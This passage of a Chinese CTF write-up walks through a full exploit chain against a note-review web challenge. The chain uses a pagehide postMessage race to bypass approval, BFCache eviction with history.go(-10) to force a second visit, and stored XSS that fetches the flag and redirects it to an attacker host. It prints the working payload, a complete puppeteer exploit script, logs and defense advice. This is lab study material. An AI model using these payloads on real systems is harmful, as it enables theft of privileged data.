[debug] /complete called ... prepared=true admin=true stateMatch=true
[debug] /complete APPROVED SET!
```

校验被绕过，`/complete` 两次调用都成功（脚本连发两条消息，互为冗余），`approved` 置位。

这里的 `top` 就是从沙箱 iframe 指向审查页顶层窗口的引用。沙箱页是不透明源（`sandbox` 不给同源权限时，iframe 内容得到的"匿名"源，与任何站点都不同源），但这并不会阻止 `postMessage`（浏览器提供的跨源窗口通信接口）跨越（跨源消息本来就是它的用途）；消息数据也只有两个标记数字，不需要读取任何页面内容。

### 2.10 时机：挤出缓存与历史回退

这一节对应 stage1 的第二段 JS（3.5 秒计时结束后的连续自导航）。批准的问题解决了，还缺渲染分支的另外三个条件：rid 匹配、`state` 匹配、`policy`。它们的答案是**同一个**：不要自己构造请求，而是**利用机器人浏览器历史里现成的那条审查页 URL**。

机器人主页面在打开 stage1 之前，访问过两个页面：审查页（首访，带 rid 和 state）和 `/api/flag`。也就是说，那条"带秘密参数的正确 URL"就存在于浏览器的历史记录里。让它重新被访问一次，三项条件自动全中：

- rid 和 state 是 URL 自带的；
- 历史回退是浏览器自己发起的导航，请求头天然带 `Sec-Fetch-Site: none`（无来源）和 `Sec-Fetch-Dest: document`（整页），`policy` 自动通过。

但回退有一个必须处理的问题：**BFCache**（Back/Forward Cache，前进后退缓存）。浏览器会把最近访问过的页面整体缓存在内存里（包括页面结构 DOM（Document Object Model，文档对象模型）和 JavaScript 状态），按后退键时优先从缓存恢复。从缓存恢复不会向服务器发请求，服务器根本不知道"第二次访问"发生过。

对照实验可以直接看出这个差异：

**直接回退**（让机器人打开一个 4 秒后自动执行 `history.go(-10)` 的页面）：

```text
（日志只有首访、api/flag、stage1 三条，回退后没有任何新请求）
```

**先做 8 次连续导航，再回退**：

```text
[bot-frame-nav:main] http://host.docker.internal:9975/stage1?ph=evict&nn=1
...（nn=2 到 nn=8）
[bot-req:main] GET http://localhost:3000/reports/check?rid=...&state=...
[check-debug] 2nd-visit note=true policy=true stateOK=true prepared=true approved=true used=false
```

对照实验中：直接回退命中了 BFCache（无请求，链路死掉）；先连开 8 个新文档再回退，才变成真实的网络请求。原因是 Chromium（Chrome 浏览器的开源内核）给每个标签页的 BFCache 条目数量设置有上限，**连续加载足够多的新文档会把最早的条目挤出缓存**，被挤出的条目再回退时只能重新向服务器请求。

stage1 里负责这件事的代码（即 2.5 前置块里 stage1 页面的第二段 JS，此处单独看）：

```js
// 每次导航间隔 120ms，连做 8 次，把历史堆到 11 条
if (nn < 8) { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=" + (nn+1); }, 120); }
else { setTimeout(function(){ history.go(-10); }, 200); }   // 回退 10 步到栈底
```

为什么是 `go(-10)`：回退动作发生时，主页面历史栈共 11 条（审查页首访、api/flag、stage1、8 个自导航变体）。从栈顶的第 11 条回退 10 步，正好落在栈底的审查页条目上。

### 2.11 渲染与外传

一句话：检查全部通过后，服务器把笔记 HTML 原样渲染进响应；其中的 XSS 以管理员身份读走 flag。

回退（2.10）触发的这次请求通过了渲染分支的全部检查：

```text
2nd-visit note=true policy=true stateOK=true prepared=true approved=true used=false
```

服务器先把 `used` 置为 true（防止同一轮审查被重复消费），然后渲染模板 `review-document.ejs`：笔记 HTML 被原样插入页面，且该响应没有任何 CSP。此时页面上出现的是攻击者笔记里存好的 XSS 代码（创建笔记时写入，长度 111 个字符，刚好塞进 128 个字符的上限）：

```html
<img src=q onerror='fetch("/api/flag").then(r=>r.text()).then(t=>location="//host.docker.internal:9975/f?"+t)'>
```

（就是 2.2/2.3 创建的那条 payload。）

执行细节：

1. `img` 的地址 `q` 不存在，加载失败触发 `onerror`（服务端日志里能看到 `GET /reports/q` 返回 404，证明笔记 HTML 被真正解析进页面并执行了）。
2. `fetch("/api/flag")` 是同源请求，自动携带管理员的 `sid` cookie；flag 早在机器人访问 `/api/flag` 时就被写进了本轮审查记录（`currentReview.flag`），所以服务器直接返回。
3. 收到响应后，用 `location` 跳转到攻击者服务器，把结果放在查询串里发送出去。为什么用页面跳转而不是 `fetch` 上传？两个原因：跳转不涉及跨域读取与 CORS（Cross-Origin Resource Sharing，跨源资源共享：浏览器允许跨源读取响应的一套规则）；并且顶层导航不受 CSP 的"获取指令"管辖（`fetch` 会受 `connect-src` 类规则约束），在带 CSP 的页面里更稳。本例的渲染页本身没有 CSP，两条路都通；跳转的字节开销也最小。

攻击者服务器收到形如 `/f?{"flag":"..."}` 的请求，取出 flag。

### 2.12 整条链的时序全览

| 时刻 | 主体 | 动作 | 服务端状态变化 |
|---|---|---|---|
| T+0 | 攻击者 | 提交含 XSS 笔记编号的 stage1 网址 | 创建本轮审查记录 |
| T+1s | 机器人 | 首次访问审查页 | `visited=true`，发放 view cookie |
| T+1s | 机器人 | 访问 `/api/flag` | `flag` 写入内存 |
| T+1s | 机器人 | 调用 `/reports/arm` | `prepared=true` |
| T+1s | 机器人 | 打开 stage1（自动附加 rid） |  |
| T+1s | stage1 | 弹窗打开审查界面，攻击脚本登记为待审查文档 | `document` 写入 |
| T+1s | 审查界面 | 沙箱 iframe 加载攻击脚本 |  |
| T+2s | 攻击脚本 | iframe 被替换的瞬间（pagehide）投递消息 |  |
| T+2s | 审查界面 | 调用 `/complete` | `approved=true` |
| T+4.5s | stage1 | 开始连续 8 次自导航 |  |
| T+5.5s | stage1 | `history.go(-10)` 回退到审查页 |  |
| T+5.5s | 机器人 | 审查页被真实重新请求，全部检查通过 | `used=true`，渲染笔记原文 |
| T+5.5s | 渲染出的页面上的 XSS 代码 | 读 `/api/flag`，跳转攻击者服务器 | flag 外传 |
| T+11s | 机器人 | 10 秒停留结束，关闭浏览器 | 本轮审查记录清空 |

> 本章小结：只靠机器人的固定流程，审查渲染分支永远不会被触发（它只访问审查页一次）。要让笔记原文被渲染出来，攻击者必须自己安排"第二次访问"，并让 2.6 检查表里的每一项都通过。


## 三、速查与参考

本章是查询性内容（端点表、状态字段表、防护表、批准交互的源码），供回查使用；流程性的内容已在第二章按发生顺序讲完。两类材料的分工：流程怎么走，看第二章；某个端点/字段/防护具体怎么写，在下面各表与小节里查。

### 3.1 端点速查

除首页 `/` 外，全部功能端点如下（共 10 个；GET / POST 是 HTTP 的两种请求方法，GET 用于获取内容，POST 用于提交数据）：

| 方法 | 路径 | 权限 | 作用 |
|---|---|---|---|
| POST | `/create` | 无 | 创建笔记（标题≤10 个字符，HTML≤128 个字符） |
| GET | `/note/:id` | 无 | 预览笔记（CSP 严格防护，转义输出） |
| POST | `/report` | 无 | 提交待审查网址，触发机器人；从网址的 `note` 参数提取笔记编号 |
| GET | `/reports/session` | 机器人令牌 | 把当前会话升级为管理员 |
| GET | `/reports/check` | 管理员 | 审查页。首访只留标记；二访进入渲染分支，全部检查通过才输出笔记原文 |
| POST | `/reports/arm/:id` | 机器人令牌 | 置 `prepared=true`，表示机器人已就位 |
| GET | `/review` | 管理员 + rid 匹配 | 打开审查界面：登记攻击脚本 URL，渲染带沙箱 iframe 的页面 |
| GET | `/sandbox` | 管理员 + rid + 已登记 document | 沙箱页，加载攻击脚本；带 `&end` 时返回空文档 |
| POST | `/complete` | 管理员 + id/state 匹配 + prepared | 置 `approved=true` |
| GET | `/api/flag` | 管理员 | 返回 flag（首次调用时把 flag 写进本次审查记录） |

（表内 URL 即网址；iframe 指"在页面中嵌入另一个页面"的 HTML 标签，后文反复用到。）

### 3.2 批准交互：`/review`、`/sandbox`、`/complete`

这三个端点共同构成"审查交互"，也是攻击脚本能进入机器人浏览器的唯一方式。

一句话机制：攻击脚本要进入挑战域，靠的不是直接请求，而是让机器人打开审查界面；审查界面把脚本装进沙箱 iframe 运行，并用一次"批准"（`/complete`）为最终渲染放行。

**`/review`**：管理员打开后，服务器把 URL 参数 `u`（攻击者提供的地址）登记为"待审查文档"，然后渲染审查界面：

```js
target.searchParams.set("rid", currentReview.id);   // 给攻击者 URL 追加 rid 参数
currentReview.document = { url: target.href, nonce: randomId(16) };   // document：待审查脚本地址 + 一次性 nonce
res.render("review", { nonce, id: currentReview.id, state: currentReview.nonce });   // 渲染审查界面（nonce、id、state 传入模板）
```

审查界面 `review.ejs` 里有一个沙箱 iframe（即带 `sandbox="allow-scripts"` 限制的嵌入子页面：允许执行脚本，但不给它任何同源权限）和一段负责"批准"的逻辑：

```html
<iframe id="viewer" sandbox="allow-scripts" src="/sandbox?rid=..."></iframe>
<script nonce="...">
  const viewer = document.getElementById("viewer");
  let closing = false;                                    // closing：iframe 是否已进入“替换空文档”阶段

  addEventListener("message", (e) => {
    if (!closing || e.source === viewer.contentWindow) return;   // 校验条件
    fetch("/complete", { method: "POST", body: JSON.stringify(report) }); // 批准
  });

  viewer.addEventListener("load", () => {
    if (closing) return;
    closing = true;
    viewer.src = "/sandbox?rid=...&end";   // 第一次加载后，把 iframe 换成空文档
  });
</script>
```

这段逻辑的意图很明确：iframe 第一次加载完成后立刻换成空文档（"审查完毕，关闭文档"）；此后如果还收到来自沙箱窗口的消息，则判断为"文档关闭时仍有交互"，视为审查通过，调用 `/complete`。校验逻辑是那行身份比较：**消息来源是当前 iframe 窗口的会被丢弃**（正常时序下该窗口的脚本已随替换卸载，不会再有消息）；能通过的是被替换下来的旧文档窗口在卸载瞬间投递的消息。

**`/sandbox`**：渲染一个极简单的页面，关键只有一行：用 script 标签（HTML 里负责加载和执行 JavaScript 的标签）加载攻击脚本。这个标签带着服务器生成的 nonce（number used once，一次性随机数，用来证明内容出自服务器）：

```html
<script nonce="<%= nonce %>" src="<%= url %>"></script>
```

响应 CSP 为 `sandbox allow-scripts; default-src 'none'; script-src 'nonce-...'` 等。两个效果：iframe 内是一个**不透明源（opaque origin）**，脚本能跑但没有挑战域的任何权限；脚本能加载，是因为那个 script 标签由服务器自己写下并带上了正确的 nonce。URL 带 `&end` 参数时直接返回空文档 `<!doctype html>`。

**`/complete`**：批准接口。四个条件全部满足才置位：

```js
if (currentReview.id === id && currentReview.prepared && req.session.admin && state === currentReview.nonce) {   // 四个条件全满足才置位
  currentReview.approved = true;                      // approved=true：渲染分支必查项
}
```

id 和 state 由调用方提供；`prepared` 由机器人自动置位（每轮审查会自动调用就绪接口，见 2.5）；admin 由机器人的会话满足。所以对攻击者来说，**只要能让"审查界面在正确时机调用一次 /complete"，approved 就是自己的了**。

### 3.3 本轮审查的状态字段

服务器用全局变量 `currentReview` 保存"当前这轮审查"的全部状态。它在 `POST /report` 时创建；清空发生在同一个请求的处理函数里：机器人流程结束后发送 "The reviewer finished." 响应（或异常返回 "Review failed"），随后 `finally` 块执行 `currentReview = null`，本轮全部字段失效、下一轮提交从此可被接受。

表里第一行的 `id` 就是全文反复出现的 `rid`（同一个值的两个写法，来自 `const id = randomId(12)`，24 个十六进制字符）。它随本轮审查一起创建，随后以网址参数（`?rid=...`）或路径参数（`/reports/arm/:id`）的形式在请求之间传递。作用有两条：把同一轮审查的各请求（check、arm、review、complete）绑定在一起核对；以及作为不可预测的随机值，防止他人构造出针对某一轮的请求。审查结束后它随 `currentReview` 一起清空，下一轮重新生成。

| 字段 | 创建时 | 谁在什么时候修改 |
|---|---|---|
| `id` | 随机 12 字节 | 固定不变（`rid` 参数就是它） |
| `nonce` | 随机 16 字节 | 固定不变（`state` 参数、`/complete` 校验都用它） |
| `noteId` | 从提交网址的 `note` 参数提取 | 固定不变 |
| `visited` | false | 机器人首次访问审查页时置 true |
| `flag` | null | 机器人访问 `/api/flag` 时写入 |
| `prepared` | false | 机器人调用 `/reports/arm` 时置 true |
| `document` | 无 | 打开 `/review` 时写入攻击脚本地址 |
| `approved` | false | `/complete` 被正确调用时置 true |
| `used` | false | 渲染分支渲染成功后置 true |

### 3.4 防护汇总

把服务器和浏览器侧的防护措施集中列一遍（逐条的处理过程见第二章 2.3 到 2.11 各节）：

| 防护措施 | 位置 | 作用 |
|---|---|---|
| 预览页 CSP + 转义 | `/note/:id` | 笔记 HTML 在预览时不可执行 |
| 沙箱 iframe（`sandbox allow-scripts`） | `/review` + `/sandbox` | 攻击脚本可运行但处于不透明源，拿不到挑战域权限 |
| 脚本 nonce + Trusted Types（浏览器禁止把普通字符串直接写进页面的机制）禁用 | `/sandbox` CSP | 禁止在沙箱内注入/执行未授权脚本 |
| `SameSite=Lax` | 会话 cookie | 跨站 `fetch` 不带管理员身份 |
| Fetch Metadata 检查（`policy`） | 渲染分支 | 只接受"浏览器自己发起"的页面导航 |
| `nonce`（`state` 参数） | 渲染分支 | 请求必须携带服务器生成的 `nonce` |
| `prepared`（必须先就绪） | 渲染分支 | 本轮审查必须真的走到机器人访问阶段 |
| `approved`（必须先批准） | 渲染分支 | 批准流程必须先完成 |
| `used`（一次性） | 渲染分支 | 渲染成功后置 true，此后同一轮审查不可复用 |
| `visited` + `view` cookie | 审查页 | 首次访问只留标记，不渲染 |
| `noteId` 必须来自提交网址 | `POST /report` | 渲染哪篇笔记由提交网址的 `note` 参数决定，不能凭空指定 |

## 四、完整链复现日志

（每轮审查都会生成新编号：本节日志与 2.x 示例来自不同的运行，各自内部自洽，不影响对照；编号在不同运行间不同属于预期。）

攻击脚本对本地环境运行一次，标准输出：

```text
[c] Failed to load resource: the server responded with a status of 404 (Not Found)
[note] 89ab25b00447b966c54f
[!!!!FLAG!!!!] {"flag":"pwnsec{real_flag_on_remote}"}
[report] 200 — 完整链执行中 (popup approved + 挤出链)...
```

同一时刻，服务器侧日志（按时间顺序，省略重复行；插桩输出，说明见 2.5）：

```text
# 机器人开始工作：审查页首访
[bot-req:main] GET http://localhost:3000/reports/check?rid=a551e4289172dffd677b96d4&state=995638e087ec1873cb90be34cdd99f89
[check-debug] rid=a551e428 admin=true secSite=none secDest=document visited=false

# flag 载入内存
[bot-req:main] GET http://localhost:3000/api/flag

# 机器人打开攻击者页面（note 参数是本轮绑定的笔记编号，rid 由机器人追加）
[bot-frame-nav:main] http://host.docker.internal:9975/stage1?note=89ab25b00447b966c54f&rid=a551e4289172dffd677b96d4

# 弹窗里的审查界面完成 pagehide 竞态，批准成功
[bot-console:main+popup:log] REVIEW-MSG source-is-viewer=false closing=true data={"p":1}
[debug] /complete called id=a551e4289172dffd677b96d4 state=995638e087ec1873cb90be34cdd99f89 prepared=true admin=true stateMatch=true
[debug] /complete APPROVED SET! id=a551e4289172dffd677b96d4
[bot-console:main+popup:log] COMPLETE-RESP 200

# 主页面连续 8 次自导航（挤出 BFCache）
[bot-frame-nav:main] http://host.docker.internal:9975/stage1?ph=evict&nn=1
...（nn=2 至 nn=8）

# 历史回退触发真实的第二次访问，全部检查通过
[bot-req:main] GET http://localhost:3000/reports/check?rid=a551e4289172dffd677b96d4&state=995638e087ec1873cb90be34cdd99f89
[check-debug] 2nd-visit note=true policy=true stateOK=true prepared=true approved=true used=false

# 渲染的笔记触发 XSS：图片加载失败、读 flag、外传
[bot-req:main] GET http://localhost:3000/reports/q                     # <img src=q> 的相对路径
[bot-req:main] GET http://localhost:3000/api/flag                      # XSS 的同源读取
[bot-frame-nav:main] http://host.docker.internal:9975/f?{%22flag%22:%22pwnsec{real_flag_on_remote}%22}
```

每一行都能和前面的分析对上：`source-is-viewer=false` 对应 2.9 的竞态，`nn=1..8` 对应 2.10 的挤出，`2nd-visit` 行的 `approved=true` 对应批准生效后的放行，最后的 `/f?...` 就是 flag 外传。

## 五、攻击脚本逐段讲解

完整攻击脚本如下（注释为整理时补写，代码逻辑与原脚本一致）。运行前先改脚本开头的两处路径：`CHROME` 指向本机浏览器、`puppeteer` 指向你解压的题目目录（示例路径里的 `handout` 按实际解压目录名替换）。这类完整的利用代码常被称为 exploit（漏洞利用），下面随代码逐段对照前文：

```js
// readonce-revenge 完整攻击脚本：弹窗批准 + 主页面挤出链 + XSS 外传
const http = require("node:http");
const CHROME = "/Users/aserlili/Library/Caches/ms-playwright/chromium-1223/chrome-mac-arm64/Google Chrome for Testing.app/Contents/MacOS/Google Chrome for Testing";
const puppeteer = require("/Users/aserlili/bw-security-analysis/workspace/20260913_090327_34a3_web-analysis/handout/bot/node_modules/puppeteer");
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const PORT = 9975;
const CHAL = "http://localhost:3000";

// 这段脚本会被注入沙箱运行：pagehide 时向顶层投递两条消息（2.8）
const S2 = 'addEventListener("pagehide", function(){ try { top.postMessage({p:1}, "*"); top.postMessage({p:2}, "*"); } catch(e){} });';

const srv = http.createServer((req, res) => {
  const u = new URL(req.url, "http://x");
  // flag 接收端点：flag 以查询串形式到达
  if (u.pathname === "/f") { console.log("\n[!!!!FLAG!!!!]", decodeURIComponent(u.search.slice(1)).slice(0, 100)); res.writeHead(200); res.end(); return; }
  // 沙箱中运行的攻击脚本（注入后就是上面的 S2）
  if (u.pathname === "/s2p.js") { res.writeHead(200, {"Content-Type":"application/javascript"}); res.end(S2); return; }
  // 机器人要访问的页面：弹窗 + 挤出链
  if (u.pathname === "/stage1") {
    res.writeHead(200, {"Content-Type":"text/html"});
    res.end('<!doctype html><body>S1<script>\n' +
      'var rid = new URLSearchParams(location.search).get("rid");\n' +
      'var note = new URLSearchParams(location.search).get("note");\n' +
      // 弹窗打开审查界面（顶层导航带管理员 cookie），u 指向 S2
      'window.open("' + CHAL + '/review?u=http%3A%2F%2Fhost.docker.internal%3A' + PORT + '%2Fs2p.js&rid=" + rid + "&note=" + note, "REV");\n' +
      // 主页面：3.5 秒后开始连续自导航，把审查页挤出 BFCache
      'var ph = new URLSearchParams(location.search).get("ph");\n' +
      'var nn = parseInt(new URLSearchParams(location.search).get("nn")||"0");\n' +
      'if (ph === "evict") {\n' +
      '  if (nn < 8) { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=" + (nn+1); }, 120); }\n' +
      '  else { setTimeout(function(){ history.go(-10); }, 200); }\n' +
      '} else { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=1"; }, 3500); }\n' +
      '</scr' + 'ipt></body>');   // 拆开 script 结束标签：内联脚本里出现完整 </script> 会被 HTML 解析器当场截断
    return;
  }
  res.writeHead(404); res.end();
});
srv.listen(PORT, async () => {
  try {
    const browser = await puppeteer.launch({ executablePath: CHROME, headless: "new", args: ["--no-sandbox"] });
    const p = await browser.newPage();
    p.on("console", m => console.log("[c]", m.text().slice(0, 110)));
    await p.setExtraHTTPHeaders({ "X-Bot-Token": "local-bot-token" });
    await p.goto(CHAL + "/reports/session", { waitUntil: "domcontentloaded" });
    await p.setExtraHTTPHeaders({});
    // 创建含 XSS 的笔记（注入的 note 编号进 URL，供 /report 提取）
    const note = await p.evaluate(async (o, port) => {
      const r = await fetch(o + "/create", { method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"},
        body: "title=p&html=" + encodeURIComponent('<img src=q onerror=\'fetch("/api/flag").then(r=>r.text()).then(t=>location="//host.docker.internal:'+port+'/f?"+t)\'>') });
      const m = (r.url||"").match(/note\/([a-f0-9]+)/); return m ? m[1] : "FAIL";
    }, CHAL, PORT);
    console.log("[note]", note);
    // 提交 stage1 网址（带 note 参数，供 /report 提取 currentReview.noteId；弹窗 URL 里同样带 note，审查界面不读它），此后全自动
    const st = await p.evaluate(async (o, s, n) => {
      const r = await fetch(o + "/report", { method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"},
        body:"url="+encodeURIComponent(s+"?note="+n) });
      return r.status;
    }, CHAL, "http://host.docker.internal:"+PORT+"/stage1", note);
    console.log("[report]", st, "— 完整链执行中 (popup approved + 挤出链)...");
    await sleep(16000);
    await browser.close();
  } catch (e) { console.log("ERR", e.message); }
  finally { srv.close(); process.exit(0); }
});
```

脚本结构对应前文各节：

| 脚本部分 | 作用 | 对应章节 |
|---|---|---|
| `/reports/session` 一行 | 调试残留：把脚本内浏览器升级为管理员（创建笔记与提交审查都不检查身份，这一步对主链没有功能贡献，保留以与实测脚本一致；实测去掉令牌头后完整链仍成功，该步骤不参与拿 flag） | 2.5 |
| `p.evaluate(fetch /create)` | 创建含 XSS 的笔记，取回编号 | 2.2、2.3 |
| `p.evaluate(fetch /report)` | 提交 `stage1?note=编号`，触发机器人 | 2.5 |
| `/stage1` 页面的 `window.open` | 弹窗打开审查界面，登记 S2 | 2.9 |
| `/s2p.js` 的 pagehide 逻辑 | 穿过审查界面的身份检查，触发批准 | 2.9 |
| `ph=evict` 导航链 + `go(-10)` | 挤出 BFCache，触发第二次访问 | 2.10 |
| XSS 笔记 + `/f` 接收端点 | 读 flag 并外传 | 2.11 |

## 六、复现指南

### 环境要求

- Docker（含 compose 插件）；
- Node.js 18 及以上，用于在宿主机运行攻击脚本；
- 一个可用的 Chrome/Chromium 浏览器（Chromium 是 Chrome 的开源版本）。脚本默认使用本机 playwright（一个浏览器自动化工具，安装时会缓存 Chromium）中的浏览器，路径写死在脚本开头（`CHROME` 与 `puppeteer` 两行），按本机情况修改即可；
- 攻击脚本依赖的 `puppeteer` 模块（puppeteer：用代码控制 Chrome 自动化操作的库，题目机器人也基于它，见 2.5）直接取自题目附件（题目解压目录下的 `bot/node_modules/puppeteer`），无需另外安装。

### 步骤

```bash
# 1. 启动题目环境（首次构建约 1 到 2 分钟）
cd readonce-revenge
docker compose up -d --build
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/    # 期望 200

# 2. 把第五章的完整脚本保存成 solve_revenge_final.js（放在任意目录，能访问 localhost:3000 即可），
#    改好开头的两处路径（CHROME、puppeteer）后运行
node solve_revenge_final.js
```

期望输出：

```text
[c] Failed to load resource: the server responded with a status of 404 (Not Found)
[note] 89ab25b00447b966c54f
[!!!!FLAG!!!!] {"flag":"pwnsec{real_flag_on_remote}"}
[report] 200 — 完整链执行中 (popup approved + 挤出链)...
```

`[!!!!FLAG!!!!]` 后面 JSON（JavaScript Object Notation，一种文本数据格式）里的值就是外传的 flag；其中 `real_flag_on_remote` 来自 compose 环境变量，改成别的值即验证读到的是配置值。

### 观察与调试

想看每一步，另开一个终端：

```bash
docker logs -f readonce-revenge-challenge-1
```

容器名由 compose 项目名生成（项目名默认取目录名），因此以 `readonce-revenge/` 为解压目录时容器名即上例；如报“无此容器”，用 `docker ps` 查看实际名字。

完整链经过的日志锚点（出现顺序）。

这些行来自本地复现时加在 `server.js`、`bot.js`、`src/views/review.ejs` 里的 `console.log` 插桩，其中 `review.ejs` 是页面代码，它的输出经 bot.js 的 console 钩子转发进服务器日志。原始附件没有这些日志代码；要在自己的复现环境看到同样的输出，保留或自行添加这些插桩即可。

1. `check-debug ... visited=false`：机器人首访审查页；
2. `REVIEW-MSG source-is-viewer=false closing=true`：pagehide 竞态命中；
3. `APPROVED SET`：批准置位；
4. `stage1?ph=evict&nn=1` 至 `nn=8`：挤出导航；
5. `2nd-visit ... approved=true`：第二次访问全部通过；
6. `GET /reports/q`（404，XSS 图片）与 `GET /f?{...}`（外传）。

### 常见问题

| 现象 | 原因与处理 |
|---|---|
| `[report] 429` | 上一轮审查还没结束（每轮约忙 10 秒），稍等重试 |
| 一直收不到 flag，日志停在 `nn=8` 之后没有 `2nd-visit` | 挤出次数不够，个别环境 BFCache 上限更高，把脚本里的 `nn < 8` 调大（如 12）再试 |
| 收不到 flag，`2nd-visit` 行缺少 `approved=true` | 弹窗未成功打开。检查 Chrome 能否弹窗、脚本里 `window.open` 的 `u=` 参数（攻击脚本地址）是否指向 `host.docker.internal:<端口>/s2p.js` |
| Linux 主机 | `host.docker.internal` 需要 compose 里加 `extra_hosts: ["host.docker.internal:host-gateway"]`，或在 stage1 与 XSS 里改用宿主机的局域网地址 |
| 换端口 | compose 映射与脚本 `CHAL` 变量需同步修改 |
| 把靶机放到远程（云主机）后，机器人访问不到攻击者服务器 | 把攻击者页面挂到 webhook.site 等免费公网服务；具体做法与两个坑见 2.5 前置段的"真实 CTF（远程靶机）时的地址" |

## 七、防御建议

从这条链出发，可以给同类"自动化审查"系统几条通用建议：

1. **批准信号不要用"窗口身份比较"实现。** 本次的 `/complete` 触发依赖 `e.source === viewer.contentWindow` 这种时序敏感的判断。更稳的做法是使用 `MessageChannel`（浏览器提供的点对点消息通道）把端口显式交给受信任的一方，或者让服务端生成一次性挑战值、要求通过既定的通道返回。
2. **一次性 URL 的"一次性"要覆盖完整生命周期。** 本例的 `rid/state` 在一次审查中可被重复使用（批准前后都可），历史里的旧 URL 因此是有效凭证。让 state 在首次消费后立即失效、或与一次性票据（single-use token）绑定，能切断"重放历史 URL"这条路。
3. **不要假设历史导航一定会命中内存缓存。** BFCache 的容量、驱逐策略因浏览器和版本而异。本次攻击正是主动把缓存条目挤出，使"回退"退化为"重新请求"。防御方设计控制流时不能把"回退没有网络请求"当安全前提。
4. **Fetch Metadata 只能作为纵深防御。** `Sec-Fetch-Site: none` 对用户主动发起的导航天然为真，无法区分"真人回退"与"被脚本驱动的回退"。
5. **统一所有渲染出口的 CSP。** 笔记预览页有严格 CSP，审查渲染分支却直接原样输出笔记 HTML 且无 CSP。用户内容在哪里被输出，哪里就需要一致的防护。
6. **沙箱机制本身工作正常。** 不透明源、`script-src` nonce、Trusted Types 禁用都按预期拦住了越权访问；出问题的是"批准"语义，而不是隔离强度。
7. **机器人口令与会话密钥要用强随机值、从环境注入。** `BOT_TOKEN` 若沿用默认值或可猜，等于公开了换取管理员会话的口令：攻击者直接冒充机器人就能在审查窗口期读走 flag，无需任何前端攻击。`SESSION_SECRET` 是 cookie 完整性的纵深防御措施，在服务器端会话存储的架构下单独泄漏难以直接利用，但配错会导致重启后会话全部失效、多实例间会话漂移。

## 附录

### 附 A：源码文件对照

| 文件 | 作用 |
|---|---|
| `src/server.js` | 全部路由、会话、状态机（`currentReview`）、防护检查 |
| `src/views/review.ejs` | 审查界面：沙箱 iframe + 消息/批准逻辑 |
| `src/views/sandbox.ejs` | 沙箱页：带 nonce 的 script 标签加载攻击脚本 |
| `src/views/review-document.ejs` | 渲染分支的模板：原样输出笔记 HTML（无 CSP） |
| `src/views/note.ejs` | 预览页模板：转义输出（有 CSP） |
| `bot/bot.js` | 机器人程序：管理员会话、四个固定访问步骤、10 秒停留 |

### 附 B：术语速查

| 术语 | 一句话说明 |
|---|---|
| CTF | Capture The Flag，网络安全夺旗赛 |
| flag | 比赛的最终目标字符串（本题格式 `pwnsec{...}`） |
| Docker | 容器工具：把程序打包进隔离环境运行 |
| Docker Compose | Docker 的编排工具：用 `docker-compose.yml` 描述服务（镜像、端口、环境变量），一条 `docker compose up` 启动 |
| CSP | Content Security Policy，内容安全策略：浏览器限制页面能加载和执行哪些内容 |
| XSS | Cross-Site Scripting，跨站脚本攻击：让攻击者的脚本在受害网站页面上执行 |
| HTML | HyperText Markup Language，网页的组成语言 |
| HTTP | HyperText Transfer Protocol，超文本传输协议：浏览器和服务器之间的通信规则 |
| URL | Uniform Resource Locator，即网址 |
| JSON | JavaScript Object Notation，一种文本数据格式 |
| iframe | HTML 里"在页面中嵌入另一个页面"的标签 |
| nonce | number used once，一次性随机数：服务器生成，用来证明内容或请求出自服务器（本题每轮审查中与审查记录绑定、进入 URL 的两个随机值：`id`→`rid`、`nonce`→`state`，见 3.3） |
| rid | 审查编号：`currentReview.id` 的 URL 参数名，每轮审查随机生成、结束即失效（见 3.3） |
| 审查页（`/reports/check`） | 机器人的审查入口页。首访留标记；二访进入渲染分支，全部检查通过才输出笔记原文 |
| 审查界面（`/review`） | 管理员页面，内含沙箱 iframe 与批准逻辑，是攻击脚本的入口 |
| BFCache | 浏览器把访问过的页面整体缓存进内存的机制；回退时优先恢复，不产生网络请求 |
| Fetch Metadata | 请求头 `Sec-Fetch-*` 系列，标明请求由谁发起；浏览器自动附加，脚本无法伪造 |
| Opaque Origin（不透明源） | `sandbox` 属性不带 `allow-same-origin` 时，iframe 内容得到的"匿名"源，与任何站点都不同源 |
| SameSite=Lax | cookie 属性：跨站请求不带 cookie，但顶层导航例外 |
| pagehide | 页面被导航替换/关闭前触发的事件，是页面最后一次执行 JavaScript 的机会 |
| postMessage | 跨源窗口之间传递消息的 API，不要求同源 |
| WindowProxy | 浏览器给窗口对象套的代理，页面脚本访问 `window`、`contentWindow` 时得到的都是它 |
| headless | 无界面模式：浏览器不显示窗口，只由程序驱动 |

### 附 C：本地环境版本

| 组件 | 版本/说明 |
|---|---|
| 挑战服务器运行时 | 容器内 `node:22-bookworm-slim` + Chromium |
| 本地复现时的机器人浏览器 | 本机 Chromium（playwright 缓存，headless 无界面模式） |
| Docker 端口 | `3000:3000` |

### 附 D：远程载体的完整链接（httpbin 版本，可直接复现）

两条链接都是 httpbin 的 base64 端点：它会把 URL 里的 base64 解码后原样返回（响应不带 CSP）。用浏览器或 curl 直接打开即可核对；本附录用最终有效的攻击版本（pagehide 竞态 S2 + 两段式 stage1）生成。

**S2 脚本的地址**

```text
https://httpbin.org/base64/YWRkRXZlbnRMaXN0ZW5lcigicGFnZWhpZGUiLCBmdW5jdGlvbigpeyB0cnkgeyB0b3AucG9zdE1lc3NhZ2Uoe3A6MX0sICIqIik7IHRvcC5wb3N0TWVzc2FnZSh7cDoyfSwgIioiKTsgfSBjYXRjaChlKXt9IH0pOw==
```

**stage1 页面的地址**（提交时末尾追加 `?note=<编号>`；下面链接里用 EXAMPLE 占位）

```text
